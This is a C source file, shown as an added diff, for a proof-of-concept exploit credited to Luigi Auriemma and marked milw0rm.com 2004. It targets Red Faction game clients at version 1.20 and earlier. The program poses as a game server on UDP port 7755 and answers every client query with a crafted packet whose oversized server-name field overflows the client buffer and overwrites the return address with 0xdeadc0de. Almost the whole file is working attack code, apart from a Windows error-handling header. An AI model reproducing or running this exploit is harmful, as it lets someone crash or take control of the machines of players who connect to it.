@@ -1,0 +1,191 @@
+/*
+
+by Luigi Auriemma
+
+UNIX & WIN VERSION
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#ifdef WIN32
+#include <winsock.h>
+#include "winerr.h"
+
+#define close closesocket
+#else
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#endif
+
+#define VER "0.1"
+#define BUFFSZ 2048
+#define PORT 7755
+#define RETADDR "\xde\xc0\xad\xde" // 0xdeadc0de
+
+void std_err(void);
+
+int main(int argc, char *argv[]) {
+int sd,
+on = 1,
+psz;
+struct sockaddr_in peer;
+u_char *buff,
+info[] =
+"\x00\x01" // packet number
+"\x00\x00" // packet size - 4
+"\x89" // version (x89 = 1.20)
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" // server name (260 bytes)
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+RETADDR "\0"
+"\x00" // type of game
+"\x01" // players
+"\x08" // max players
+"Relentless\0" // mapname
+"\x00" // dunno?
+"\x00"; // password:
+// 4 = yes, 0 = none
+
+setbuf(stdout, NULL);
+
+fputs("\n"
+"RedFaction <= 1.20 broadcast clients buffer overflow "VER"\n"
+"by Luigi Auriemma\n"
+"e-mail: aluigi@altervista.org\n"
+"web: http://aluigi.altervista.org\n"
+"\n", stdout);
+
+#ifdef WIN32
+WSADATA wsadata;
+WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+peer.sin_addr.s_addr = INADDR_ANY;
+peer.sin_port = htons(PORT);
+peer.sin_family = AF_INET;
+psz = sizeof(peer);
+
+printf("\nBinding UDP port %u\n", PORT);
+
+sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+if(sd < 0) std_err();
+
+if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
+< 0) std_err();
+if(bind(sd, (struct sockaddr *)&peer, psz)
+< 0) std_err();
+
+buff = malloc(BUFFSZ);
+if(!buff) std_err();
+
+*(u_short *)(info + 2) = sizeof(info) - 5;
+
+printf("Return address of clients will be overwritten with 0x%08lx\n", *(u_long *)RETADDR);
+
+fputs("\nClients:\n", stdout);
+while(1) {
+if(recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz)
+< 0) std_err();
+
+printf("%s:%hu -> ", inet_ntoa(peer.sin_addr), htons(peer.sin_port));
+
+if(sendto(sd, info, sizeof(info) - 1, 0, (struct sockaddr *)&peer, psz)
+< 0) std_err();
+fputs("BOOM\n", stdout);
+}
+
+close(sd);
+return(0);
+}
+
+#ifndef WIN32
+void std_err(void) {
+perror("\nError");
+exit(1);
+}
+#endif
+--------------------------------------------------------------------------------------------------
+//winerr.h 
+/*
+Header file used for manage errors in Windows
+It support socket and errno too
+(this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+char *error;
+
+switch(WSAGetLastError()) {
+case 10004: error = "Interrupted system call"; break;
+case 10009: error = "Bad file number"; break;
+case 10013: error = "Permission denied"; break;
+case 10014: error = "Bad address"; break;
+case 10022: error = "Invalid argument (not bind)"; break;
+case 10024: error = "Too many open files"; break;
+case 10035: error = "Operation would block"; break;
+case 10036: error = "Operation now in progress"; break;
+case 10037: error = "Operation already in progress"; break;
+case 10038: error = "Socket operation on non-socket"; break;
+case 10039: error = "Destination address required"; break;
+case 10040: error = "Message too long"; break;
+case 10041: error = "Protocol wrong type for socket"; break;
+case 10042: error = "Bad protocol option"; break;
+case 10043: error = "Protocol not supported"; break;
+case 10044: error = "Socket type not supported"; break;
+case 10045: error = "Operation not supported on socket"; break;
+case 10046: error = "Protocol family not supported"; break;
+case 10047: error = "Address family not supported by protocol family"; break;
+case 10048: error = "Address already in use"; break;
+case 10049: error = "Can't assign requested address"; break;
+case 10050: error = "Network is down"; break;
+case 10051: error = "Network is unreachable"; break;
+case 10052: error = "Net dropped connection or reset"; break;
+case 10053: error = "Software caused connection abort"; break;
+case 10054: error = "Connection reset by peer"; break;
+case 10055: error = "No buffer space available"; break;
+case 10056: error = "Socket is already connected"; break;
+case 10057: error = "Socket is not connected"; break;
+case 10058: error = "Can't send after socket shutdown"; break;
+case 10059: error = "Too many references, can't splice"; break;
+case 10060: error = "Connection timed out"; break;
+case 10061: error = "Connection refused"; break;
+case 10062: error = "Too many levels of symbolic links"; break;
+case 10063: error = "File name too long"; break;
+case 10064: error = "Host is down"; break;
+case 10065: error = "No Route to Host"; break;
+case 10066: error = "Directory not empty"; break;
+case 10067: error = "Too many processes"; break;
+case 10068: error = "Too many users"; break;
+case 10069: error = "Disc Quota Exceeded"; break;
+case 10070: error = "Stale NFS file handle"; break;
+case 10091: error = "Network SubSystem is unavailable"; break;
+case 10092: error = "WINSOCK DLL Version out of range"; break;
+case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+case 10071: error = "Too many levels of remote in path"; break;
+case 11001: error = "Host not found"; break;
+case 11002: error = "Non-Authoritative Host not found"; break;
+case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+case 11004: error = "Valid name, no data record of requested type"; break;
+default: error = strerror(errno); break;
+}
+fprintf(stderr, "\nError: %s\n", error);
+exit(1);
+}
+
+
+// milw0rm.com [2004-03-04]
